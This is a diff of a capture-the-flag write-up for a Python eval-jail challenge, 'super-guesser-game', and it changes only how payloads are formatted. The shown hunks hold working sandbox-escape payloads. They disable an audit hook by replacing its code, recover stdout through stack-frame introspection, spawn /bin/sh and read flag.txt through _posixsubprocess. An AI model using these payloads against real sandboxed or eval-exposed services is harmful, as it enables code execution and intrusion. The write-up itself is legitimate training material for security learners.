@@ -205,7 +205,9 @@ So, let's combine our two primitives against the original target to leak the fil
 ```bash
 Welcome to my guesser game!
 Can u guess the number? between 1 and 9999999999999 >
-__builtins__['__import__']('os').write(1, ', '.join(__builtins__['__import__']('os').listdir()).encode('utf-8')+b'\n')
+```
+`__builtins__['__import__']('os').write(1, ', '.join(__builtins__['__import__']('os').listdir()).encode('utf-8')+b'\n')`
+```bash
 service.py, flag.txt
 Guess game end!!!
 ```
@@ -323,7 +325,9 @@ Raised event: compile
 Raised event: exec
 Raised event: sys._current_frames
 Evaluated data:
-{'game_score': 0, 'right_guesser_question_answer': 5953965730357, 'challenge_original_stdout': <_io.TextIOWrapper name='<stdout>' mode='w' encoding='utf-8'>}
+```
+`{'game_score': 0, 'right_guesser_question_answer': 5953965730357, 'challenge_original_stdout': <_io.TextIOWrapper name='<stdout>' mode='w' encoding='utf-8'>}`
+```bash
 Guess game end!!!
 ```
 
@@ -340,7 +344,9 @@ Raised event: compile
 Raised event: exec
 Raised event: sys._current_frames
 Evaluated data:
-{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f47a2e6d810>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '~/ctfs/csaw22-finals/misc/super-guesser-game/service.py', '__cached__': None, 'random': <module 'random' from '~/.pyenv/versions/3.10.5/lib/python3.10/random.py'>, 'StringIO': <class '_io.StringIO'>, 'sys': <module 'sys' (built-in)>, 'BLACKED_LIST': ['compile', 'eval', 'exec'], 'eval_func': <built-in function eval>, 'm': 'exec', 'noop': <function noop at 0x7f47a2fafd90>, 'my_audit_hook': <function my_audit_hook at 0x7f47a2d29c60>, 'guesser': <function guesser at 0x7f47a2d29cf0>, 'WELCOME': "<long prompt>", 'main': <function main at 0x7f47a2d29d80>}
+```
+`{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f47a2e6d810>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '~/ctfs/csaw22-finals/misc/super-guesser-game/service.py', '__cached__': None, 'random': <module 'random' from '~/.pyenv/versions/3.10.5/lib/python3.10/random.py'>, 'StringIO': <class '_io.StringIO'>, 'sys': <module 'sys' (built-in)>, 'BLACKED_LIST': ['compile', 'eval', 'exec'], 'eval_func': <built-in function eval>, 'm': 'exec', 'noop': <function noop at 0x7f47a2fafd90>, 'my_audit_hook': <function my_audit_hook at 0x7f47a2d29c60>, 'guesser': <function guesser at 0x7f47a2d29cf0>, 'WELCOME': "<long prompt>", 'main': <function main at 0x7f47a2d29d80>}`
+```bash
 Guess game end!!!
 ```
 
@@ -393,7 +399,9 @@ Let's restore `sys.stdout` to its original value and do a dummy `print()` as pro
 ```bash
 Welcome to my guesser game!
 Can u guess the number? between 1 and 9999999999999 >
-[__builtins__['__import__']('sys').__setattr__('stdout', list(__builtins__['__import__']('sys')._current_frames().values())[-1].f_back.f_locals['challenge_original_stdout']), print("Hello World!")]
+```
+`[__builtins__['__import__']('sys').__setattr__('stdout', list(__builtins__['__import__']('sys')._current_frames().values())[-1].f_back.f_locals['challenge_original_stdout']), print("Hello World!")]`
+```bash
 Hello World!
 Guess game end!!!
 ```
@@ -440,17 +448,18 @@ def create_function(name):
     def y():
         pass
     y_code = types.CodeType(0, 0, 0,
-                            y.__code__.co_nlocals,
-                            y.__code__.co_stacksize,
-                            y.__code__.co_flags,
-                            y.__code__.co_code,
-                            y.__code__.co_consts,
-                            y.__code__.co_names,
-                            y.__code__.co_varnames,
-                            y.__code__.co_filename,
-                            name,
-                            y.__code__.co_firstlineno,
-                            y.__code__.co_lnotab)      # raises code.__new__
+      y.__code__.co_nlocals,
+      y.__code__.co_stacksize,
+      y.__code__.co_flags,
+      y.__code__.co_code,
+      y.__code__.co_consts,
+      y.__code__.co_names,
+      y.__code__.co_varnames,
+      y.__code__.co_filename,
+      name,
+      y.__code__.co_firstlineno,
+      y.__code__.co_lnotab
+    )                                                  # raises code.__new__
     return types.FunctionType(y_code, globals(), name) # raises function.__new__
 
 
@@ -467,7 +476,9 @@ Welcome to my guesser game!
 Can u guess the number? between 1 and 9999999999999 >
  [*] right_guesser_question_answer: 4545313753576
 Raised event: builtins.input
-[list(__builtins__['__import__']('sys')._current_frames().values())[-1].f_back.f_globals['my_audit_hook'].__setattr__('__code__', (lambda arg1, arg2: None).__code__), __builtins__['__import__']('os').open('flag.txt', 0)]
+```
+`[list(__builtins__['__import__']('sys')._current_frames().values())[-1].f_back.f_globals['my_audit_hook'].__setattr__('__code__', (lambda arg1, arg2: None).__code__), __builtins__['__import__']('os').open('flag.txt', 0)]`
+```bash
 Raised event: builtins.input/result
 Raised event: compile
 Raised event: exec
@@ -488,7 +499,9 @@ Ok, now we have all we need to construct our final payload, and get the flag. Le
 ```bash
 Welcome to my guesser game!
 Can u guess the number? between 1 and 9999999999999 >
-[__builtins__['__import__']('sys').__setattr__('stdout', list(__builtins__['__import__']('sys')._current_frames().values())[-1].f_back.f_locals['challenge_original_stdout']), print("Hello World!"), list(__builtins__['__import__']('sys')._current_frames().values())[-1].f_back.f_globals['my_audit_hook'].__setattr__('__code__', (lambda arg1, arg2: None).__code__), __builtins__['__import__']('os').system('/bin/sh')]
+```
+`[__builtins__['__import__']('sys').__setattr__('stdout', list(__builtins__['__import__']('sys')._current_frames().values())[-1].f_back.f_locals['challenge_original_stdout']), print("Hello World!"), list(__builtins__['__import__']('sys')._current_frames().values())[-1].f_back.f_globals['my_audit_hook'].__setattr__('__code__', (lambda arg1, arg2: None).__code__), __builtins__['__import__']('os').system('/bin/sh')]`
+```bash
 Hello World!
 $ ls
 flag.txt  service.py
@@ -722,7 +735,9 @@ Welcome to my guesser game!
 Can u guess the number? between 1 and 9999999999999 >
  [*] right_guesser_question_answer: 2311328684755
 Raised event: builtins.input
-__import__('_posixsubprocess').fork_exec( ('/bin/cat', 'flag.txt'), [b'/bin/cat'], True, (), None, None, -1, -1, -1, -1, -1, -1, *__import__('os').pipe(), False, False, None, None, None, -1, None)
+```
+`__import__('_posixsubprocess').fork_exec( ('/bin/cat', 'flag.txt'), [b'/bin/cat'], True, (), None, None, -1, -1, -1, -1, -1, -1, *__import__('os').pipe(), False, False, None, None, None, -1, None)`
+```bash
 Raised event: builtins.input/result
 Raised event: compile
 Raised event: exec
